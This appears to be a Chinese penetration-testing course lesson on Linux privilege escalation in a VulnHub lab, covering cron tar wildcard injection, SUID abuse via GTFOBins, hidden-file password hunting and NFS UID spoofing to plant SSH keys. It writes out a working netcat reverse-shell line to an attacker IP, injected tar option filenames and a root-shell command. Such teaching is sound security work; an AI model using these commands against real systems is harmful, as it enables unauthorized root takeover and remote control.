#  075：第44天 - Linux权限提升实战教程 🔓

![](img/9ebd2d50a51785f5f4565fe95a8048b8_0.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_1.png)

在本节课中，我们将要学习Linux系统中几种常见的权限提升方法，包括定时任务提权、SUID提权以及通过NFS共享和隐藏文件获取更高权限。课程内容将结合实例，力求简单直白，让初学者能够看懂。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_3.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_5.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_7.png)

## 概述 📋

权限提升是渗透测试中的关键环节，它允许攻击者从一个低权限账户获取系统更高权限（如root）。本节课将深入探讨几种在Linux环境下实用的提权技术。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_9.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_11.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_13.png)

---

![](img/9ebd2d50a51785f5f4565fe95a8048b8_15.png)

## 第一部分：Linux定时任务提权 ⏰

![](img/9ebd2d50a51785f5f4565fe95a8048b8_17.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_19.png)

上一节我们介绍了SUDO滥用权限的提权方法，本节中我们来看看如何利用Linux的定时任务进行提权。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_21.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_23.png)

### 什么是定时任务？

![](img/9ebd2d50a51785f5f4565fe95a8048b8_25.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_27.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_29.png)

在Linux系统中，定时任务由 `cron` 守护进程管理，它允许用户在特定时间自动执行命令或脚本。我们在信息收集阶段，就需要关注系统的定时任务配置。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_31.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_33.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_35.png)

系统级的定时任务配置文件位于 `/etc/crontab`。用户级的定时任务则位于 `/var/spool/cron/crontabs/` 目录下，每个用户对应一个文件。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_37.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_39.png)

### 定时任务格式解析

我们可以通过 `cat /etc/crontab` 命令查看系统定时任务。其基本格式如下：

![](img/9ebd2d50a51785f5f4565fe95a8048b8_41.png)

```
* * * * * user command
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_43.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_45.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_47.png)

这五个星号分别代表：**分、时、日、月、周**。`user` 指定以哪个用户的权限执行命令，`command` 则是要执行的命令。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_49.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_50.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_52.png)

例如，`* * * * * root /path/to/backup.sh` 表示以root权限每分钟执行一次备份脚本。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_54.png)

### 靶场实例分析

![](img/9ebd2d50a51785f5f4565fe95a8048b8_56.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_58.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_60.png)

在我们的靶机中，发现了一个系统定时任务：

![](img/9ebd2d50a51785f5f4565fe95a8048b8_62.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_64.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_66.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_68.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_70.png)

```bash
* * * * * root /usr/local/bin/backup.sh
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_72.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_74.png)

这个任务以root权限每分钟执行一次 `/usr/local/bin/backup.sh` 脚本。我们需要分析这个脚本的功能，才能找到利用点。

查看脚本内容：

![](img/9ebd2d50a51785f5f4565fe95a8048b8_76.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_78.png)

```bash
#!/bin/bash
for i in $(ls /home); do
    cd /home/$i
    tar -zcf /etc/backups/$i.tar.gz *
done
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_80.png)

**脚本分析：**
1.  遍历 `/home` 目录下的所有用户文件夹（例如 bob, peter, susan）。
2.  进入每个用户的home目录。
3.  使用 `tar` 命令将该目录下的**所有文件**（`*` 通配符）打包压缩。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_82.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_84.png)

这个脚本的功能是定期备份所有用户home目录的文件。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_86.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_88.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_90.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_92.png)

### 漏洞利用：通配符注入

![](img/9ebd2d50a51785f5f4565fe95a8048b8_94.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_96.png)

这个脚本看似正常，但其漏洞在于 `tar -zcf /etc/backups/$i.tar.gz *` 这一行中对通配符 `*` 的使用。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_98.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_100.png)

**通配符基础：**
在Linux中，`*` 通配符会匹配当前目录下的所有文件和文件夹。当命令如 `cp *.txt /tmp` 执行时，Shell会先将 `*.txt` 展开为所有匹配的文件名，再执行命令。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_102.png)

**漏洞原理：**
`tar` 命令有很多选项（options）。如果我们在文件名上做手脚，让 `tar` 命令将文件名误认为是它的选项，就可能执行我们预期的操作。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_104.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_106.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_108.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_110.png)

`tar` 有一个 `--checkpoint-action` 选项，可以指定在检查点执行任意命令。我们可以利用这一点。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_112.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_114.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_116.png)

以下是利用步骤：

![](img/9ebd2d50a51785f5f4565fe95a8048b8_118.png)

1.  **在低权限用户的home目录（例如 `/home/bob`）下创建特殊文件：**

    ```bash
    # 1. 创建一个包含反弹Shell命令的脚本
    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f' > shell.sh

    # 2. 创建两个用于“欺骗”tar命令的文件
    echo '' > '--checkpoint=1'
    echo '' > '--checkpoint-action=exec=sh shell.sh'
    ```

    执行后，在 `/home/bob` 目录下会生成三个文件：`shell.sh`、`--checkpoint=1` 和 `--checkpoint-action=exec=sh shell.sh`。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_120.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_122.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_124.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_125.png)

2.  **等待定时任务执行：**
    当root用户的定时任务执行到备份 `/home/bob` 目录时，实际的命令会展开为：

    ```bash
    tar -zcf /etc/backups/bob.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
    ```

    `tar` 命令会将 `--checkpoint=1` 和 `--checkpoint-action=exec=sh shell.sh` 识别为**选项**，而不是普通文件名。这样，它就会执行 `sh shell.sh` 这个动作。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_127.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_129.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_131.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_132.png)

3.  **获取Root Shell：**
    由于定时任务是以root权限运行的，它执行的 `shell.sh` 也会获得root权限。`shell.sh` 中的命令会向攻击者机器（192.168.1.100:4444）反弹一个具有root权限的Shell。

通过这个方法，我们就成功地从普通用户bob提升到了root权限。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_134.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_136.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_138.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_140.png)

**扩展思路：**
在 `shell.sh` 中，我们不仅可以反弹Shell，还可以做其他事，例如：
*   在 `/etc/sudoers` 文件中添加当前用户，使其可以无密码使用sudo。
*   给 `/bin/bash` 等命令设置SUID权限，然后利用它提权。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_142.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_144.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_146.png)

---

![](img/9ebd2d50a51785f5f4565fe95a8048b8_148.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_150.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_152.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_153.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_155.png)

## 第二部分：SUID提权 🛡️

![](img/9ebd2d50a51785f5f4565fe95a8048b8_157.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_159.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_161.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_162.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_164.png)

上一节我们利用了定时任务，本节中我们来看看另一种经典提权方式——SUID提权。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_166.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_168.png)

### SUID权限回顾

![](img/9ebd2d50a51785f5f4565fe95a8048b8_170.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_172.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_174.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_176.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_177.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_178.png)

SUID（Set User ID）是一种特殊的文件权限。当一个具有SUID权限的可执行文件被运行时，它将**以文件所有者的身份**运行，而不是执行它的用户。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_180.png)

例如，如果 `/usr/bin/passwd` 设置了SUID且属于root，那么普通用户执行它时，会在短时间内拥有root权限来修改密码。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_182.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_184.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_185.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_186.png)

### 寻找可利用的SUID文件

![](img/9ebd2d50a51785f5f4565fe95a8048b8_188.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_190.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_192.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_194.png)

首先，我们需要在系统中寻找设置了SUID权限的可执行文件。可以使用以下命令：

![](img/9ebd2d50a51785f5f4565fe95a8048b8_196.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_198.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_200.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_202.png)

```bash
find / -type f -perm -u=s 2>/dev/null
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_204.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_206.png)

这个命令会在根目录 `/` 下查找所有设置了SUID位（`-perm -u=s`）的普通文件（`-type f`），并将错误信息（`2>/dev/null`）丢弃。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_208.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_210.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_212.png)

### 利用已知的SUID程序

![](img/9ebd2d50a51785f5f4565fe95a8048b8_214.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_216.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_218.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_220.png)

找到SUID文件后，我们需要判断哪些可以被利用。一个著名的资源是 [GTFOBins](https://gtfobins.github.io/)，它列出了大量可以通过配置不当的SUID/GUID权限进行提权的程序。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_222.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_223.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_224.png)

例如，如果发现 `taskset` 命令具有SUID权限，并且属于root，可以利用以下方式提权：

```bash
# 在GTFOBins上找到的taskset提权命令
taskset 1 /bin/bash -p
```
执行后，可能会直接获得一个root权限的bash shell（`-p` 参数用于保留特权）。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_226.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_227.png)

**实践建议：**
将 `find` 命令找到的SUID程序列表与GTFOBins网站进行比对，尝试利用已知的漏洞。这是一个需要耐心尝试的过程。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_229.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_231.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_233.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_235.png)

---

## 第三部分：其他提权思路 🔍

除了上述两种主要方法，信息收集过程中还可能发现其他提权路径。

### 查找隐藏的敏感文件

![](img/9ebd2d50a51785f5f4565fe95a8048b8_237.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_239.png)

用户有时会将密码、密钥等敏感信息保存在隐藏文件（以 `.` 开头的文件）中。我们可以尝试搜索这些文件。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_241.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_243.png)

```bash
find /home -type f -name “.*” 2>/dev/null
```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_245.png)

这个命令在 `/home` 目录下查找所有隐藏文件。例如，可能发现一个名为 `/home/susan/.secret` 的文件，里面存放着用户susan的密码。获得这个密码后，就可以切换到susan用户，进而探索该用户是否拥有更高权限（例如在 `sudoers` 列表中）。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_247.png)

### NFS低权限访问提权

![](img/9ebd2d50a51785f5f4565fe95a8048b8_249.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_251.png)

NFS（网络文件系统）允许在网络中共享目录。如果配置不当，可能允许未授权访问或权限提升。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_253.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_255.png)

1.  **信息收集：** 使用 `showmount -e <target_ip>` 命令查看目标服务器共享了哪些目录。
    ```bash
    showmount -e 192.168.78.38
    # 可能输出：/home/peter
    ```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_257.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_259.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_261.png)

2.  **挂载共享目录：** 在攻击机上创建目录并挂载目标的共享目录。
    ```bash
    mkdir /mnt/peter
    mount -t nfs 192.168.78.38:/home/peter /mnt/peter
    ```

![](img/9ebd2d50a51785f5f4565fe95a8048b8_263.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_265.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_267.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_269.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_270.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_271.png)

3.  **权限问题：** 挂载后查看文件权限，可能会显示数字ID（如 `1001`），这是因为攻击机上没有对应的用户/组名。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_273.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_275.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_276.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_278.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_280.png)

4.  **权限伪造：**
    *   在攻击机上创建一个与目标共享目录所有者UID/GID相同的用户。
    ```bash
    groupadd -g 1005 peter
    useradd -u 1001 -g 1005 peter
    passwd peter # 设置密码
    ```
    *   切换到该用户 (`su peter`)，此时就拥有了对该挂载目录的写入权限。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_281.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_283.png)

5.  **写入SSH公钥：**
    *   在攻击机生成SSH密钥对：`ssh-keygen`
    *   将公钥（`~/.ssh/id_rsa.pub`）写入挂载目录的 `~/.ssh/authorized_keys` 文件中。
    *   现在可以通过SSH免密登录到目标服务器的peter用户：`ssh peter@192.168.78.38`

![](img/9ebd2d50a51785f5f4565fe95a8048b8_285.png)

6.  **进一步的提权：** 登录后，检查新获得的用户权限。如果发现该用户属于 `docker` 组，则可以利用Docker提权。因为Docker组的成员可以运行Docker容器，并可能将主机目录挂载到容器中，从而访问或修改宿主机文件，最终获得root权限。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_287.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_289.png)

---

## 总结 🎯

![](img/9ebd2d50a51785f5f4565fe95a8048b8_291.png)

本节课中我们一起学习了多种Linux权限提升技术：

![](img/9ebd2d50a51785f5f4565fe95a8048b8_293.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_295.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_297.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_299.png)

1.  **定时任务提权**：通过分析配置不当的cron任务，利用`tar`命令的**通配符注入**漏洞，注入恶意参数从而以root权限执行命令。
2.  **SUID提权**：寻找系统中设置了SUID位的可执行文件，并利用`GTFOBins`等资源中的已知方法，将这些程序的运行权限提升为文件所有者（通常是root）权限。
3.  **信息收集提权**：
    *   通过查找**隐藏文件**发现敏感信息（如密码）。
    *   利用配置不当的**NFS共享**，通过伪造用户ID获得写权限，进而写入SSH公钥实现登录，并可能借助`docker`组等特殊权限进一步提权。

![](img/9ebd2d50a51785f5f4565fe95a8048b8_301.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_303.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_305.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_307.png)

这些方法的核心在于**细致的信息收集**和**对系统配置的深入理解**。在实际渗透测试中，需要灵活组合运用这些技术。课程中提到的VulnHub靶场（如`/home/peter`）是极佳的练习环境，建议课后实践以巩固所学知识。